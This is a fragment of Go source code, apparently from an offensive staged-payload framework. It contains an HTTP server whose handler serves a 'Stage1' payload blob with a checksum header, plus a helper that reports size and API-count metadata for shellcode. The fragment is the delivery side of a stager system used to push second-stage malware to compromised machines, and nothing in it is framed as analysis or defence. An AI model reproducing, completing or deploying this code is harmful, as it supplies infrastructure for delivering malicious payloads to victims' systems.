	w.srv = &http.Server{Addr: addr, Handler: mux}

	w.mu.Lock()
	defer w.mu.Unlock()

	go func() {
		if err := w.srv.ListenAndServe(); err != http.ErrServerClosed {
			if w.ErrCh != nil {
				w.ErrCh <- err
			}
		}
	}()
	return nil
}

func (w *WebsiteHost) Stop() {
	w.mu.Lock()
	defer w.mu.Unlock()
	if w.srv != nil {
		w.srv.Close()
	}
}

func (w *WebsiteHost) handlePayload(res http.ResponseWriter, req *http.Request) {
	w.mu.RLock()
	stage := w.Stage1
	w.mu.RUnlock()

	if len(stage) == 0 {
		http.Error(res, "not found", http.StatusNotFound)
		return
	}

	res.Header().Set("Content-Type", "application/octet-stream")
	res.Header().Set("Content-Length", fmt.Sprintf("%d", len(stage)))
	res.Header().Set("X-Payload-Checksum", w.Checksum)
	res.WriteHeader(http.StatusOK)
	io.Copy(res, bytes.NewReader(stage))
}

// StagerInfo 返回 stager 元信息。
type StagerInfo struct {
	Size       int
	APICount   int
	ServerName string
	Port       int
}

func GetStagerInfo(shellcode []byte) *StagerInfo {
	if len(shellcode) == 0 {
		return nil
	}
	return &StagerInfo{
		Size:     len(shellcode),
		APICount: 11,
	}
}
